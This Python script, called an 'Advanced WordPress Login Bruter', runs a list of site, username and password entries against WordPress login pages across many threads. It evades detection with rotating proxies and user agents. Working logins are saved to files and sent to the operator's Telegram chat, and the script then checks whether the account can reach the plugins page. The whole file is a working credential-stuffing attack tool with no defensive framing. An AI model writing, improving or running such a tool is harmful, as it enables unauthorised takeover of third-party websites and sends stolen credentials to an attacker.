import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore
from tqdm import tqdm
import time
import random
import argparse
import smtplib
import logging
from bs4 import BeautifulSoup
import matplotlib.pyplot as plt

init(autoreset=True)

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:65.0) Gecko/20100101 Firefox/65.0',
    'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Mobile Safari/537.36',
]
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/plain'
}

logging.basicConfig(filename='results.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

telegram_bot_token = 'Your bot token'
telegram_chat_id = 'Your telegram chat ID'

def send_telegram_message(message):
    telegram_api_url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    data = {
        'chat_id': telegram_chat_id,
        'text': message
    }
    try:
        requests.post(telegram_api_url, data=data)
    except Exception as e:
        logging.error(f"Failed to send Telegram message: {e}")

def send_email(subject, body, recipient):
    smtp_server = 'smtp.example.com'
    sender_email = 'your_email@example.com'
    password = 'your_password'

    message = f"Subject: {subject}\n\n{body}"

    with smtplib.SMTP(smtp_server, 587) as server:
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, recipient, message)

def randomized_delay(min_delay=2, max_delay=5):
    time.sleep(random.uniform(min_delay, max_delay))

def detect_captcha(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    if soup.find('input', {'name': 'g-recaptcha-response'}):
        return True
    return False

def fetch_proxies():
    proxy_api_url = 'https://www.proxy-list.download/api/v1/get?type=https'
    response = requests.get(proxy_api_url)
    proxies = response.text.splitlines()
    return proxies

def clean_credentials(wp_url_credentials):
    try:
        parts = wp_url_credentials.split("#", 1)
        site = parts[0].strip()

        if len(parts) == 1 or not parts[1]:
            logging.warning(f"Skipping {wp_url_credentials}: Credentials missing")
            return None

        creds = parts[1].split("@", 1)

        if len(creds) != 2 or not creds[0].strip() or not creds[1].strip():
            logging.warning(f"Skipping {wp_url_credentials}: Invalid credential format")
            return None

        user, passwd = creds[0].strip(), creds[1].strip()

        if not site.startswith('http'):
            logging.warning(f"Skipping {wp_url_credentials}: Invalid site URL")
            return None

        return site, user, passwd
    except Exception as e:
        logging.error(f"Error processing credentials for {wp_url_credentials}: {e}")
        return None

def attempt_login(wp_url_credentials, progress_bar, proxies, retries=3):
    try:
        creds = clean_credentials(wp_url_credentials)
        if creds is None:
            return

        site, user, passwd = creds

        headers['User-Agent'] = random.choice(user_agents)
        proxy = random.choice(proxies)

        for attempt in range(retries):
            try:
                response = requests.post(site, headers=headers, data={'log': user, 'pwd': passwd, 'wp-submit': 'Log In'}, timeout=10, proxies={'https': proxy})
                
                if detect_captcha(response):
                    print(Fore.YELLOW + f"[Captcha] CAPTCHA detected at {site}. Skipping...")
                    break

                if 'Dashboard' in response.text:
                    with open("dashboard.txt", "a") as dashboard_file:
                        dashboard_file.write(f"{site}#{user}@{passwd}\n")
                    
                    print(Fore.GREEN + f"[Success] Dashboard accessible --> {site}")
                    logging.info(f"Success: {site}#{user}@{passwd}")
                    send_telegram_message(f"Deeb Doob MF, Dashboard 200!\n\nSite: {site}\nUsername: {user}\nPassword: {passwd}")

                    plugins_url = site.rstrip('/') + '/wp-admin/plugins.php'
                    plugins_response = requests.get(plugins_url, headers=headers, auth=(user, passwd), timeout=10, allow_redirects=False)
                    
                    if 'Plugins' in plugins_response.text:
                        print(Fore.GREEN + f"[Success] Plugins accessible --> {site}")
                        send_telegram_message(f"Deeb Doob MF, Plugins 200!\n\nSite: {site}\nUsername: {user}\nPassword: {passwd}")
                        with open("plugins.txt", "a") as plugins_file:
                            plugins_file.write(f"{site}#{user}@{passwd}\n")
                    else:
                        print(Fore.YELLOW + f"[INFO] Dashboard accessible --> {site}")
                    break

                else:
                    print(Fore.RED + f"[Failed] Login failed --> {site}")
                    break

            except (requests.exceptions.SSLError, requests.exceptions.ConnectionError) as e:
                print(Fore.RED + f"[Error] Connection issue with {site}. Retrying...({attempt+1}/{retries})")
                if attempt == retries - 1:
                    print(Fore.RED + f"[Error] Maximum retries reached for {site}")
            except Exception as e:
                print(Fore.RED + f"[Error] An error occurred with {site}: {e}")
                break
            finally:
                randomized_delay()

    finally:
        progress_bar.update()

def visualize_attempts(success_count, failure_count):
    if success_count == 0 and failure_count == 0:
        print("No data to visualize: both success and failure counts are zero.")
        return

    labels = 'Success', 'Failed'
    sizes = [success_count, failure_count]
    colors = ['green', 'red']
    explode = (0.1, 0)

    if success_count == 0:
        sizes = [failure_count]
        labels = ['Failed']
        colors = ['red']
        explode = [0]
    elif failure_count == 0:
        sizes = [success_count]
        labels = ['Success']
        colors = ['green']
        explode = [0.1]

    fig1, ax1 = plt.subplots()
    ax1.pie(sizes, explode=explode, labels=labels, colors=colors, autopct='%1.1f%%', shadow=True, startangle=90)
    ax1.axis('equal')
    plt.title('Login Attempts Summary')
    plt.show()

def main():
    init(autoreset=True)

    parser = argparse.ArgumentParser(description="Advanced WordPress Login Bruter")
    parser.add_argument('--list', required=True, help="Path to the list of WordPress sites with credentials")
    parser.add_argument('--threads', default=50, type=int, help="Number of threads to use")
    parser.add_argument('--retries', default=3, type=int, help="Number of retries per login attempt")
    parser.add_argument('--proxy', action='store_true', help="Enable proxy rotation")
    parser.add_argument('--notify', action='store_true', help="Send email/Telegram notifications on success")

    args = parser.parse_args()

    proxies = fetch_proxies() if args.proxy else [None] * args.threads

    try:
        with open(args.list, 'r') as file:
            wp_list = file.read().splitlines()
    except FileNotFoundError:
        print(Fore.RED + "File not found, please check the path and try again.")
        return

    success_count, failure_count = 0, 0

    with tqdm(total=len(wp_list), desc="Login Attempts", ncols=100) as progress_bar:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(attempt_login, wp_url_credentials, progress_bar, proxies, args.retries): wp_url_credentials for wp_url_credentials in wp_list}
            
            for future in as_completed(futures):
                wp_url_credentials = futures[future]
                try:
                    future.result()
                except Exception as e:
                    logging.error(f"Exception with {wp_url_credentials}: {e}")
                    print(Fore.RED + f"[Error] Exception occurred with {wp_url_credentials}: {e}")

    if args.notify:
        send_email(subject="WordPress Login Script Finished", body="The script has completed. Check logs for details.", recipient="admin@example.com")

    visualize_attempts(success_count, failure_count)

if __name__ == "__main__":
    main()
